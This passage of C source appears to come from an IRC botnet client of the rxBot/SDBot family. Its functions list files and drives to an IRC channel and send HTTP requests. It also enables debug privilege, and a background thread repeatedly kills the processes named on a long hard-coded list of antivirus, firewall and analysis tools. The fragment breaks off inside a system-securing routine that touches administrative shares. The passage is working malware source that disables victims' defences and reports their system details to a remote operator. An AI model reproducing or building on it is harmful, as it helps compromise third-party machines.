						_snprintf(sendbuf,(sizeof(sendbuf)-1),"</TD>\r\n<TD WIDTH=\"%d\"><CODE>%s</CODE></TD>\r\n<TD WIDTH=\"%d\" ALIGN=\"right\"><CODE>%dk</CODE></TD>\r\n</TR>\r\n",
							COL2,tmpDate,COL3,(WFD.nFileSizeLow/1024));
					} else 
						_snprintf(sendbuf,sizeof(sendbuf),"%-31s  %-21s (%i bytes)\r\n",WFD.cFileName,tmpDate,WFD.nFileSizeLow);
			}
			fsend(sock,sendbuf,strlen(sendbuf),0);

			if (chan) 
				Sleep(FLOOD_DELAY);
		}
      
	}
	FindClose(Hnd);

	if (chan) 
		sprintf(sendbuf,"PRIVMSG %s :Found %s Files and %s Directories\n",chan,commaI64(count),commaI64(count2));
	else if (URL) 
		sprintf(sendbuf,"<TR>\r\n<TD COLSPAN=\"3\"><HR></TD>\r\n</TR>\r\n</TABLE>\r\n</BODY>\r\n</HTML>\r\n"); 
	else 
		sprintf(sendbuf,"Found: %i Files and %i Directories\r\n",count,count2);
	fsend(sock,sendbuf,strlen(sendbuf),0);

	return 0;
}

void HTTP_Send_File(SOCKET sock, char *file)
{
	char buffer[1024];

	unsigned int Fsize,Fsend=1024,move;
	DWORD mode=0;

	HANDLE testfile = CreateFile(file,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
	if (testfile == INVALID_HANDLE_VALUE) 
		return;

	Fsize = GetFileSize(testfile,NULL);
	
	while (Fsize) {
		memset(buffer,0,sizeof(buffer));

		if (Fsend>Fsize) 
			Fsend=Fsize;
		move=0-Fsize;

		SetFilePointer(testfile, move, NULL, FILE_END);
		ReadFile(testfile, buffer, Fsend, &mode, NULL);

		int bytes_sent=fsend(sock, buffer, Fsend, 0);
		if (bytes_sent == SOCKET_ERROR) {
			if (fWSAGetLastError() != WSAEWOULDBLOCK) 
				break;
			else 
				bytes_sent = 0;
		}
		Fsize=Fsize-bytes_sent;
	}

	if (testfile != INVALID_HANDLE_VALUE) 
		CloseHandle(testfile);

	return;
}

char *File_To_HTML(char *file)
{
	for (unsigned int c=0; c<strlen(file); c++)
		if (file[c] == 92) 
			file[c] = 47;

	return file;
}

void HTTP_Connect(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *host, int port, char *method, char *url, char *referer)
{
	char sendbuf[IRCLINE], buffer[256];

	WSADATA wsaData;
	fWSAStartup(MAKEWORD(1,1), &wsaData);

	SOCKET hsock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)port);
	ssin.sin_addr.s_addr = ResolveAddress(host);

	if (fconnect(hsock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
		_snprintf(buffer,sizeof(buffer),"%s %s HTTP/1.1\nReferer: %s\nHost: %s\nConnection: close\n\n",method,url,((referer)?(referer):("")),host);

		fsend(hsock, buffer, strlen(buffer), 0);
		memcpy(buffer,0,sizeof(buffer));
		frecv(hsock, buffer, sizeof(buffer), 0);
	}

	fclosesocket(hsock);
	fWSACleanup();

	sprintf(sendbuf, buffer);
	if (!silent) irc_privmsg(sock, chan, sendbuf, notice);

	return;
}
#endif

BOOL FileExists(char *filename, int mode) 
{ 
	return (_access(filename, mode) != -1);
} 

const char *commaI64(unsigned __int64 number)
{
	const int size = 50;
	int counter = 0;

	static char str[size];
	memset(str, 0, sizeof(str));

	char tempStr[size];
	char *ptr1=tempStr, *ptr2;
  
	do {
		*ptr1++ = (char)((number % 10) + '0');
		number /= 10;
		if (number &&  !(++counter % 3))
			*ptr1++ = ',';
	} while(number);
  
	for( --ptr1, ptr2 = str; ptr1 >= tempStr; --ptr1)
		*ptr2++ = *ptr1;
	*ptr2 = '\0';
  
	return (str);
}

const char *DriveType(LPCSTR Drive)
{
	switch(fGetDriveType(Drive)) {
	case DRIVE_UNKNOWN:
		return ("Unknown");
	case DRIVE_NO_ROOT_DIR:
		return ("Invalid");
	case DRIVE_FIXED:
		return ("Disk");
	case DRIVE_REMOTE:
		return ("Network");
	case DRIVE_CDROM:
		return ("Cdrom");
	case DRIVE_RAMDISK:
		return ("RAM");
	default:
		return ("?");
	}
}

DKSP DiskSpace(LPCSTR Drive)
{
	DKSP dksp;
	dksp.AvailableBytes=-1;
	dksp.FreeBytes=-1;
	dksp.TotalBytes=-1;

	if (fGetDiskFreeSpaceEx)
		fGetDiskFreeSpaceEx(Drive,(PULARGE_INTEGER)&dksp.AvailableBytes,
			(PULARGE_INTEGER)&dksp.TotalBytes,(PULARGE_INTEGER)&dksp.FreeBytes);

	return (dksp);
}

DKSPKB DiskSpaceKB(LPCSTR Drive)
{
	DKSPKB dkspkb;
	DKSP dksp=DiskSpace(Drive);

	if(dksp.AvailableBytes == -1 || dksp.FreeBytes == -1 || dksp.TotalBytes == -1) {
		sprintf(dkspkb.AvailableKB, "failed");
		sprintf(dkspkb.FreeKB, "failed");
		sprintf(dkspkb.TotalKB, "failed");
	} else {
		_snprintf(dkspkb.AvailableKB,sizeof(dkspkb.AvailableKB),"%sKB",commaI64(dksp.AvailableBytes/1024));
		_snprintf(dkspkb.FreeKB,sizeof(dkspkb.FreeKB),"%sKB",commaI64(dksp.FreeBytes/1024));
		_snprintf(dkspkb.TotalKB,sizeof(dkspkb.TotalKB),"%sKB",commaI64(dksp.TotalBytes/1024));
	}

	return (dkspkb);
}

void DriveSpace(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive)
{
	char sendbuf[IRCLINE];

	DKSPKB dkspkb=DiskSpaceKB(Drive);

	if (strcmp(dkspkb.TotalKB,"failed") == 0)
		_snprintf(sendbuf, sizeof(sendbuf), "8::[4MaIn8]:: %s Drive (%s): Failed to stat, device not ready.", DriveType(Drive), Drive);
	else
		_snprintf(sendbuf, sizeof(sendbuf), "8::[4MaIn8]:: %s Drive (%s): %s total, %s free, %s available.", DriveType(Drive), Drive, dkspkb.TotalKB, dkspkb.FreeKB, dkspkb.AvailableKB);
	irc_privmsg(sock, chan, sendbuf, notice, TRUE); 
	addlog(sendbuf);

	return;
}

void DriveInfo(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive)
{
	if (Drive) {
		DriveSpace(sock, chan, notice, Drive);
	} else {
		DWORD dwSize = fGetLogicalDriveStrings(0, NULL);
		LPSTR pszDrives = (LPSTR)malloc(dwSize + 2);
		fGetLogicalDriveStrings(dwSize + 2,(LPSTR)pszDrives);

		LPCTSTR pszDrv = pszDrives;
		while (*pszDrv) {
			if (strcmp(pszDrv,"A:\\") != 0)
				DriveSpace(sock, chan, notice, pszDrv);
			pszDrv += _tcslen (pszDrv) + 1;
		}
		free(pszDrives);
	}

	return;
}

#ifndef NO_PROCESS

// globals
#ifndef NO_AVFW_KILL
int killer_delay = 30000;

//FIX ME, ENCRYPT THESE!! Make this global
char *kill_list[]={
	"AVPCC.EXE",
	"ACKWIN32.EXE",
	"ADAWARE.EXE",
	"ADVXDWIN.EXE",
	"AGENTSVR.EXE",
	"AGENTW.EXE",
	"ALERTSVC.EXE",
	"ALEVIR.EXE",
	"ALOGSERV.EXE",
	"AMON9X.EXE",
	"ANTI-TROJAN.EXE",
	"ANTIVIRUS.EXE",
	"ANTS.EXE",
	"APIMONITOR.EXE",
	"APLICA32.EXE",
	"APVXDWIN.EXE",
	"ARR.EXE",
	"ATCON.EXE",
	"ATGUARD.EXE",
	"ATRO55EN.EXE",
	"ATUPDATER.EXE",
	"ATUPDATER.EXE",
	"ATWATCH.EXE",
	"AU.EXE",
	"AUPDATE.EXE",
	"AUPDATE.EXE",
	"AUTODOWN.EXE",
	"AUTODOWN.EXE",
	"AUTOTRACE.EXE",
	"AUTOTRACE.EXE",
	"AUTOUPDATE.EXE",
	"AUTOUPDATE.EXE",
	"AVCONSOL.EXE",
	"AVE32.EXE",
	"AVGCC32.EXE",
	"AVGCTRL.EXE",
	"AVGNT.EXE",
	"AVGSERV.EXE",
	"AVGSERV9.EXE",
	"AVGUARD.EXE",
	"AVGW.EXE",
	"AVKPOP.EXE",
	"AVKSERV.EXE",
	"AVKSERVICE.EXE",
	"AVKWCTl9.EXE",
	"AVLTMAIN.EXE",
	"AVNT.EXE",
	"AVP.EXE",
	"AVP32.EXE",
	"AVPCC.EXE",
	"AVPDOS32.EXE",
	"AVPM.EXE",
	"AVPTC32.EXE",
	"AVPUPD.EXE",
	"AVPUPD.EXE",
	"AVSCHED32.EXE",
	"AVSYNMGR.EXE",
	"AVWIN95.EXE",
	"AVWINNT.EXE",
	"AVWUPD.EXE",
	"AVWUPD32.EXE",
	"AVWUPD32.EXE",
	"AVWUPSRV.EXE",
	"AVXMONITOR9X.EXE",
	"AVXMONITORNT.EXE",
	"AVXQUAR.EXE",
	"AVXQUAR.EXE",
	"BACKWEB.EXE",
	"BARGAINS.EXE",
	"BD_PROFESSIONAL.EXE",
	"BEAGLE.EXE",
	"BELT.EXE",
	"BIDEF.EXE",
	"BIDSERVER.EXE",
	"BIPCP.EXE",
	"BIPCPEVALSETUP.EXE",
	"BISP.EXE",
	"BLACKD.EXE",
	"BLACKICE.EXE",
	"BLSS.EXE",
	"BOOTCONF.EXE",
	"BOOTWARN.EXE",
	"BORG2.EXE",
	"BPC.EXE",
	"BRASIL.EXE",
	"BS120.EXE",
	"BUNDLE.EXE",
	"BVT.EXE",
	"CCEVTMGR.EXE"
	"CSINJECT.EXE",
	"CCAPP.EXE",
	"CCEVTMGR.EXE",
	"CCPXYSVC.EXE",
	"CDP.EXE",
	"CFD.EXE",
	"CFGWIZ.EXE",
	"CFIADMIN.EXE",
	"CFIAUDIT.EXE",
	"CFIAUDIT.EXE",
	"CFINET.EXE",
	"CFINET32.EXE",
	"CLAW95CF.EXE",
	"CLEAN.EXE",
	"CLEANER.EXE",
	"CLEANER3.EXE",
	"CLEANPC.EXE",
	"CLICK.EXE",
	"CMD32.EXE",
	"CMESYS.EXE",
	"CMGRDIAN.EXE",
	"CMON016.EXE",
	"CONNECTIONMONITOR.EXE",
	"CPD.EXE",
	"CPF9X206.EXE",
	"CPFNT206.EXE",
	"CTRL.EXE",
	"CV.EXE",
	"CWNB181.EXE",
	"CWNTDWMO.EXE",
	"Claw95.EXE",
	"CLAW95CF.EXE",
	"DATEMANAGER.EXE",
	"DCOMX.EXE",
	"DEFALERT.EXE",
	"DEFSCANGUI.EXE",
	"DEFWATCH.EXE",
	"DEPUTY.EXE",
	"DIVX.EXE",
	"DLLCACHE.EXE",
	"DLLREG.EXE",
	"DOORS.EXE",
	"DPF.EXE",
	"DPFSETUP.EXE",
	"DPPS2.EXE",
	"DRWATSON.EXE",
	"DRWEB32.EXE",
	"DRWEBUPW.EXE",
	"DSSAGENT.EXE",
	"DVP95.EXE",
	"DVP95_0.EXE",
	"ECENGINE.EXE",
	"EFPEADM.EXE",
	"EMSW.EXE",
	"ENT.EXE",
	"ESAFE.EXE",
	"ESCANH95.EXE",
	"ESCANHNT.EXE",
	"ESCANV95.EXE",
	"ESPWATCH.EXE",
	"ETHEREAL.EXE",
	"ETRUSTCIPE.EXE",
	"EVPN.EXE",
	"EXANTIVIRUS-CNET.EXE",
	"EXE.AVXW.EXE",
	"EXPERT.EXE",
	"EXPLORE.EXE",
	"F-RBOT.EXE",
	"F-SDBOT.EXE",
	"F-SPYBOT.EXE",
	"F-AGOBOT.EXE",
	"F-RBOT.EXE",
	"F-RXBOT.EXE",
	"F-AV.EXE",
	"F-PHATBOT.EXE",
	"F-SPYBOT.EXE",
	"F-FW.EXE",
	"F-RBOT.EXE",
	"F-AGNT95.EXE",
	"F-PROT.EXE",
	"F-PROT95.EXE",
	"F-STOPW.EXE",
	"FAMEH32.EXE",
	"FAST.EXE",
	"FCH32.EXE",
	"FIH32.EXE",
	"FINDVIRU.EXE",
	"FIREWALL.EXE",
	"FLOWPROTECTOR.EXE",
	"FNRB32.EXE",
	"FP-WIN.EXE",
	"FP-WIN_TRIAL.EXE",
	"FPROT.EXE",
	"FRW.EXE",
	"FSAA.EXE",
	"FSAV.EXE",
	"FSAV32.EXE",
	"FSAV530STBYB.EXE",
	"FSAV530WTBYB.EXE",
	"FSAV95.EXE",
	"FSGK32.EXE",
	"FSM32.EXE",
	"FSMA32.EXE",
	"FSMB32.EXE",
	"GATOR.EXE",
	"GBMENU.EXE",
	"GBPOLL.EXE",
	"GENERICS.EXE",
	"GMT.EXE",
	"GUARD.EXE",
	"GUARDDOG.EXE",
	"HIJACKTHIS.EXE",
	"HACKTRACERSETUP.EXE",
	"HBINST.EXE",
	"HBSRV.EXE",
	"HOTACTIO.EXE",
	"HOTPATCH.EXE",
	"HTLOG.EXE",
	"HTPATCH.EXE",
	"HWPE.EXE",
	"HXDL.EXE",
	"HXIUL.EXE",
	"IAMAPP.EXE",
	"IAMSERV.EXE",
	"IAMSTATS.EXE",
	"IBMASN.EXE",
	"IBMAVSP.EXE",
	"ICLOAD95.EXE",
	"ICLOADNT.EXE",
	"ICMON.EXE",
	"ICSUPP95.EXE",
	"ICSUPP95.EXE",
	"ICSUPPNT.EXE",
	"IDLE.EXE",
	"IEDLL.EXE",
	"IEDRIVER.EXE",
	"IEXPLORER.EXE",
	"IFACE.EXE",
	"IFW2000.EXE",
	"INETLNFO.EXE",
	"INFUS.EXE",
	"INFWIN.EXE",
	"INIT.EXE",
	"INTDEL.EXE",
	"INTREN.EXE",
	"IOMON98.EXE",
	"IPARMOR.EXE",
	"IRIS.EXE",
	"ISASS.EXE",
	"ISRV95.EXE",
	"ISTSVC.EXE",
	"JAMMER.EXE",
	"JDBGMRG.EXE",
	"JEDI.EXE",
	"KAVLITE40ENG.EXE",
	"KAVPERS40ENG.EXE",
	"KAVPF.EXE",
	"KEENVALUE.EXE",
	"KERIO-PF-213-EN-WIN.EXE",
	"KERIO-WRL-421-EN-WIN.EXE",
	"KERIO-WRP-421-EN-WIN.EXE",
	"KERNEL32.EXE",
	"KILLPROCESSSETUP161.EXE",
	"LAUNCHER.EXE",
	"LDNETMON.EXE",
	"LDPRO.EXE",
	"LDPROMENU.EXE",
	"LDSCAN.EXE",
	"LNETINFO.EXE",
	"LOADER.EXE",
	"LOCALNET.EXE",
	"LOCKDOWN.EXE",
	"LOCKDOWN2000.EXE",
	"LOOKOUT.EXE",
	"LORDPE.EXE",
	"LSETUP.EXE",
	"LUALL.EXE",
	"LUALL.EXE",
	"LUAU.EXE",
	"LUCOMSERVER.EXE",
	"LUINIT.EXE",
	"LUSPT.EXE",
	"MAPISVC32.EXE",
	"MCAGENT.EXE",
	"MCMNHDLR.EXE",
	"MCSHIELD.EXE",
	"MCTOOL.EXE",
	"MCUPDATE.EXE",
	"MCUPDATE.EXE",
	"MCVSRTE.EXE",
	"MCVSSHLD.EXE",
	"MD.EXE",
	"MFIN32.EXE",
	"MFW2EN.EXE",
	"MFWENG3.02D30.EXE",
	"MGAVRTCL.EXE",
	"MGAVRTE.EXE",
	"MGHTML.EXE",
	"MGUI.EXE",
	"MINILOG.EXE",
	"MMOD.EXE",
	"MONITOR.EXE",
	"MOOLIVE.EXE",
	"MOSTAT.EXE",
	"MPFAGENT.EXE",
	"MPFSERVICE.EXE",
	"MPFTRAY.EXE",
	"MRFLUX.EXE",
	"MSCONFIG.EXE"
	"MSAPP.EXE",
	"MSBB.EXE",
	"MSBLAST.EXE",
	"MSCACHE.EXE",
	"MSCCN32.EXE",
	"MSCMAN.EXE",
	"MSDM.EXE",
	"MSDOS.EXE",
	"MSIEXEC16.EXE",
	"MSINFO32.EXE",
	"MSLAUGH.EXE",
	"MSMGT.EXE",
	"MSMSGRI32.EXE",
	"MSSMMC32.EXE",
	"MSSYS.EXE",
	"MSVXD.EXE",
	"MU0311AD.EXE",
	"MWATCH.EXE",
	"N32SCANW.EXE",
	"NAV.EXE",
	"AUTO-PROTECT.NAV80TRY.EXE",
	"NAVAP.NAVAPSVC.EXE",
	"NAVAPSVC.EXE",
	"NAVAPW32.EXE",
	"NAVDX.EXE",
	"NAVENGNAVEX15.NAVLU32.EXE",
	"NAVLU32.EXE",
	"NAVNT.EXE",
	"NAVSTUB.EXE",
	"NAVW32.EXE",
	"NAVWNT.EXE",
	"NC2000.EXE",
	"NCINST4.EXE",
	"NDD32.EXE",
	"NEOMONITOR.EXE",
	"NEOWATCHLOG.EXE",
	"NETSTAT.EXE",
	"NETARMOR.EXE",
	"NETD32.EXE",
	"NETINFO.EXE",
	"NETMON.EXE",
	"NETSCANPRO.EXE",
	"NETSPYHUNTER-1.2.EXE",
	"NETUTILS.EXE",
	"NISSERV.EXE",
	"NISUM.EXE",
	"NMAIN.EXE",
	"NOD32.EXE",
	"NORMIST.EXE",
	"NORTON_INTERNET_SECU_3.0_407.EXE",
	"NOTSTART.EXE",
	"NPF40_TW_98_NT_ME_2K.EXE",
	"NPFMESSENGER.EXE",
	"NPROTECT.EXE",
	"NPSCHECK.EXE",
	"NPSSVC.EXE",
	"NSCHED32.EXE",
	"NSSYS32.EXE",
	"NSTASK32.EXE",
	"NSUPDATE.EXE",
	"NT.EXE",
	"NTRTSCAN.EXE",
	"NTVDM.EXE",
	"NTXconfig.EXE",
	"NUI.EXE",
	"NUPGRADE.EXE",
	"NUPGRADE.EXE",
	"NVARCH16.EXE",
	"NVC95.EXE",
	"NVSVC32.EXE",
	"NWINST4.EXE",
	"NWSERVICE.EXE",
	"NWTOOL16.EXE",
	"OGRC.EXE",
	"OLLYDBG.EXE",
	"ONSRVR.EXE",
	"OPTIMIZE.EXE",
	"OSTRONET.EXE",
	"OTFIX.EXE",
	"OUTPOST.EXE",
	"OUTPOST.EXE",
	"OUTPOSTINSTALL.EXE",
	"OUTPOSTPROINSTALL.EXE",
	"PADMIN.EXE",
	"PANIXK.EXE",
	"PATCH.EXE",
	"PAVCL.EXE",
	"PAVPROXY.EXE",
	"PAVSCHED.EXE",
	"PAVW.EXE",
	"PCC2002S902.EXE",
	"PCC2K_76_1436.EXE",
	"PCCIOMON.EXE",
	"PCCNTMON.EXE",
	"PCCWIN97.EXE",
	"PCCWIN98.EXE",
	"PCDSETUP.EXE",
	"PCFWALLICON.EXE",
	"PCIP10117_0.EXE",
	"PCSCAN.EXE",
	"PDSETUP.EXE",
	"PENIS.EXE",
	"PERISCOPE.EXE",
	"PERSFW.EXE",
	"PERSWF.EXE",
	"PF2.EXE",
	"PFWADMIN.EXE",
	"PGMONITR.EXE",
	"PINGSCAN.EXE",
	"PLATIN.EXE",
	"POP3TRAP.EXE",
	"POPROXY.EXE",
	"POPSCAN.EXE",
	"PORTDETECTIVE.EXE",
	"PORTMONITOR.EXE",
	"POWERSCAN.EXE",
	"PPINUPDT.EXE",
	"PPTBC.EXE",
	"PPVSTOP.EXE",
	"PRIZESURFER.EXE",
	"PRMT.EXE",
	"PRMVR.EXE",
	"PROCDUMP.EXE",
	"PROCESSMONITOR.EXE",
	"PROCEXPLORERV1.0.EXE",
	"PROGRAMAUDITOR.EXE",
	"PROPORT.EXE",
	"PROTECTX.EXE",
	"PSPF.EXE",
	"PURGE.EXE",
	"PUSSY.EXE",
	"PVIEW95.EXE",
	"QDCSFS.EXE",
	"QCONSOLE.EXE",
	"QSERVER.EXE",
	"RAPAPP.EXE",
	"RAV7.EXE",
	"RAV7WIN.EXE",
	"RAV8WIN32ENG.EXE",
	"RAY.EXE", "RB32.EXE",
	"RCSYNC.EXE",
	"REALMON.EXE",
	"REGED.EXE",
	"REGEDT32.EXE",
	"REGEDIT.EXE",
	"RESCUE.EXE",
	"RESCUE32.EXE",
	"RRGUARD.EXE",
	"RSHELL.EXE",
	"RTVSCAN.EXE",
	"RTVSCN95.EXE",
	"RULAUNCH.EXE",
	"RUN32DLL.EXE",
	"RUNDLL.EXE",
	"RUNDLL16.EXE",
	"RUXDLL32.EXE",
	"SBSERV.EXE",
	"SYMTRAY.EXE",
	"SAFEWEB.EXE",
	"SAHAGENT.EXE",
	"SAVE.EXE",
	"SAVENOW.EXE",
	"SBSERV.EXE",
	"SC.EXE",
	"SCAM32.EXE",
	"SCAN32.EXE",
	"SCAN95.EXE",
	"SCANPM.EXE",
	"SCRSCAN.EXE",
	"SCRSVR.EXE",
	"SCVHOST.EXE",
	"SD.EXE",
	"SERV95.EXE",
	"SERVICE.EXE",
	"SERVLCE.EXE",
	"SERVLCES.EXE",
	"SETUPVAMEEVAL.EXE",
	"SETUP_FLOWPROTECTOR_US.EXE",
	"SFC.EXE",
	"SGSSFW32.EXE",
	"SH.EXE",
	"SHELLSPYINSTALL.EXE",
	"SHN.EXE",
	"SHOWBEHIND.EXE",
	"SMC.EXE",
	"SMS.EXE",
	"SMSS32.EXE",
	"SOAP.EXE",
	"SOFI.EXE",
	"SPERM.EXE",
	"SPF.EXE",
	"SPHINX.EXE", 
	"SPOLER.EXE",
	"SPOOLCV.EXE",
	"SPOOLSV32.EXE",
	"SPYXX.EXE",
	"SREXE.EXE",
	"SRNG.EXE",
	"SS3EDIT.EXE",
	"SSGRATE.EXE",
	"SSG_4104.EXE",
	"ST2.EXE",
	"START.EXE",
	"STCLOADER.EXE",
	"SUPFTRL.EXE",
	"SUPPORT.EXE",
	"SUPPORTER5.EXE",
	"SVC.EXE",
	"SVCHOSTC.EXE",
	"SVCHOSTS.EXE",
	"SVSHOST.EXE",
	"SWEEP95.EXE",
	"SWEEPNET.SWEEPSRV.SYS.SWNETSUP.EXE",
	"SYMPROXYSVC.EXE",
	"SYMTRAY.EXE",
	"SYSEDIT.EXE",
	"SYSTEM.EXE",
	"SYSTEM32.EXE",
	"SYSUPD.EXE",
	"TASKMGR.EXE",
	"TASKMO.EXE",
	"TAUMON.EXE",
	"TBSCAN.EXE",
	"TC.EXE",
	"TCA.EXE",
	"TCM.EXE",
	"TDS-3.EXE",
	"TDS2-98.EXE",
	"TDS2-NT.EXE",
	"TEEKIDS.EXE",
	"TFAK.EXE",
	"TFAK5.EXE",
	"TGBOB.EXE",
	"TITANIN.EXE",
	"TITANINXP.EXE",
	"TRACERT.EXE",
	"TRICKLER.EXE",
	"TRJSCAN.EXE",
	"TRJSETUP.EXE",
	"TROJANTRAP3.EXE",
	"TSADBOT.EXE",
	"TVMD.EXE",
	"TVTMD.EXE",
	"UNDOBOOT.EXE",
	"UPDAT.EXE",
	"UPDATE.EXE",
	"UPDATE.EXE",
	"UPGRAD.EXE",
	"UTPOST.EXE",
	"VFY.EXE",
	"VBCMSERV.EXE",
	"VBCONS.EXE",
	"VBUST.EXE",
	"VBWIN9X.EXE",
	"VBWINNTW.EXE",
	"VCSETUP.EXE",
	"VET32.EXE",
	"VET95.EXE",
	"VETTRAY.EXE",
	"VFSETUP.EXE",
	"VIR-HELP.EXE",
	"VIRUSMDPERSONALFIREWALL.EXE",
	"VNLAN300.EXE",
	"VNPC3000.EXE",
	"VPC32.EXE",
	"VPC42.EXE",
	"VPFW30S.EXE",
	"VPTRAY.EXE",
	"VSCAN40.EXE",
	"VSCENU6.02D30.EXE",
	"VSCHED.EXE",
	"VSECOMR.EXE",
	"VSHWIN32.EXE",
	"VSISETUP.EXE",
	"VSMAIN.EXE",
	"VSMON.EXE",
	"VSSTAT.EXE",
	"VSWIN9XE.EXE",
	"VSWINNTSE.EXE",
	"VSWINPERSE.EXE",
	"W32DSM89.EXE",
	"W9X.EXE",
	"WATCHDOG.EXE",
	"WEBDAV.EXE",
	"WEBSCANX.EXE",
	"WEBTRAP.EXE",
	"WFINDV32.EXE",
	"WGFE95.EXE",
	"WHOSWATCHINGME.EXE",
	"WIMMUN32.EXE",
	"WIN-BUGSFIX.EXE",
	"WIN32.EXE",
	"WIN32US.EXE",
	"WINACTIVE.EXE",
	"WINDOW.EXE",
	"WINDOWS.EXE",
	"WININETD.EXE",
	"WININIT.EXE",
	"WININITX.EXE",
	"WINLOGIN.EXE",
	"WINMAIN.EXE",
	"WINNET.EXE",
	"WINPPR32.EXE",
	"WINRECON.EXE",
	"WINSERVN.EXE",
	"WINSSK32.EXE",
	"WINSTART.EXE",
	"WINSTART001.EXE",
	"WINTSK32.EXE",
	"WINUPDATE.EXE",
	"WKUFIND.EXE",
	"WNAD.EXE",
	"WNT.EXE",
	"WRADMIN.EXE",
	"WRCTRL.EXE",
	"WSBGATE.EXE",
	"WUPDATER.EXE",
	"WUPDT.EXE",
	"WYVERNWORKSFIREWALL.EXE",
	"XPF202EN.EXE",
	"ZAPRO.EXE",
	"ZAPSETUP3001.EXE",
	"ZATUTOR.EXE",
	"ZONALM2601.EXE",
	"ZONEALARM.EXE",
	"_AVP32.EXE",
	"_AVPCC.EXE",
	"_AVPM.EXE"
};
#endif


BOOL AdjustPrivileges(char *pPriv, BOOL add)
{
	BOOL bRet = FALSE;
	TOKEN_PRIVILEGES tkp;
 	HANDLE hToken;

	if (!fOpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken))
		return bRet;

	if (!fLookupPrivilegeValue(NULL, pPriv, &tkp.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return bRet;
	}

	tkp.PrivilegeCount = 1; 
	if (add)
		tkp.Privileges[0].Attributes |= SE_PRIVILEGE_ENABLED;
	else 
		tkp.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
			tkp.Privileges[0].Attributes);

	bRet=fAdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES) NULL, 0);
	
	CloseHandle(hToken);

	return bRet;
}

int listProcesses(SOCKET sock, char *chan, BOOL notice, char *proccess, BOOL killthread, BOOL full)
{
	char sendbuf[IRCLINE];

	HANDLE hProcess, hProcess2;
	PROCESSENTRY32 pe32 = {0};
	MODULEENTRY32 me32 = {0};
	
	if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
		AdjustPrivileges(SE_DEBUG_NAME, TRUE);
		if ((hProcess = fCreateToolhelp32Snapshot(TH32CS_SNAPALL, 0)) != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(hProcess, &pe32)) {
				while (fProcess32Next(hProcess, &pe32)) {
					if (killthread) {
						#ifndef NO_AVFW_KILL
						for(int c = 0;c < (sizeof(kill_list) / sizeof(LPTSTR));c++) {
							if (lstrcmpi(pe32.szExeFile,kill_list[c]) == 0) {
 								if (hProcess2=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID))
									if (!TerminateProcess(hProcess2,0))
										CloseHandle(hProcess2);

								break;
							}
						}
						#endif
					}
					else if (!proccess) {
						if (chan) {
							hProcess2 = fCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
							me32.dwSize = sizeof(MODULEENTRY32);
							if (full) {
								if (fModule32First(hProcess2, &me32))
									sprintf(sendbuf," %s (%d)",me32.szExePath,pe32.th32ProcessID);
								else
									sprintf(sendbuf," %s (%d)",pe32.szExeFile,pe32.th32ProcessID);
							} else
								sprintf(sendbuf," %s (%d)",pe32.szExeFile,pe32.th32ProcessID);
							irc_privmsg(sock,chan,sendbuf,notice,TRUE);
							CloseHandle(hProcess2);
						}
					}
					else {
						if (strcmp(pe32.szExeFile,proccess) == 0) {
 							hProcess2 = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
							CloseHandle(hProcess);

							if (!TerminateProcess(hProcess2,0)) {
								CloseHandle(hProcess2);

								return 0;
							}
							return 1;
						 }
					}
				} 
			}
			CloseHandle(hProcess);
		}
		AdjustPrivileges(SE_DEBUG_NAME, FALSE);
	}

 	return 0;
}

DWORD WINAPI listProcessesThread(LPVOID param) 
{
	char sendbuf[IRCLINE];

	LPROC lproc = *((LPROC *)param);
	LPROC *lprocp = (LPROC *)param;
	lprocp->gotinfo = TRUE;

	sprintf(sendbuf,"8::[4PrOc8]:: Listing processes:");
	if (!lproc.silent) irc_privmsg(lproc.sock,lproc.chan,sendbuf,lproc.notice);
	
	if (listProcesses(lproc.sock,lproc.chan,lproc.notice,NULL, FALSE, lproc.full) == 0)
		sprintf(sendbuf,"8::[4PrOc8]:: Process list completed.");
	else 
		sprintf(sendbuf,"8::[4PrOc8]:: Process list failed.");

	if (!lproc.silent) irc_privmsg(lproc.sock, lproc.chan, sendbuf, lproc.notice);
	addlog(sendbuf);

	clearthread(lproc.threadnum);

	ExitThread(0);
}

int killProcess(int pid)
{
	int ret=1;

 	HANDLE pHandle;
	
	if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid)) != NULL)
		if(!TerminateProcess(pHandle,0)) {
			ret=0;
			CloseHandle(pHandle);
		}

	return ret;
}

#ifndef NO_AVFW_KILL
DWORD WINAPI kill_av(LPVOID param)
{
	while (1) {
		listProcesses(0,NULL,NULL,FALSE,NULL,TRUE);
		Sleep(killer_delay);
	}
	return 0;
}
#endif
#endif

// globals
#ifndef NO_SECSYSTEM
int secure_delay=120000;
#endif 

NetShares ShareList[]={
		{"IPC$",NULL},
		{"ADMIN$",NULL},
		{"C$","C:\\"},
		{"D$","D:\\"}
};


DWORD WINAPI SecureThread(LPVOID param) 
{
	SECURE secure = *((SECURE *)param);
	SECURE *secures = (SECURE *)param;
	secures->gotinfo = TRUE;

	if (secure.secure)
		SecureSystem(secure.sock, secure.chan, secure.notice, secure.silent);
	else
		UnSecureSystem(secure.sock, secure.chan, secure.notice, secure.silent);	

	clearthread(secure.threadnum);

	ExitThread(0);
}

BOOL SecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	char sendbuf[IRCLINE];

	if (!noadvapi32) {
		HKEY hKey; 
		if(fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey3, 0, KEY_READ|KEY_WRITE, &hKey) == ERROR_SUCCESS) {
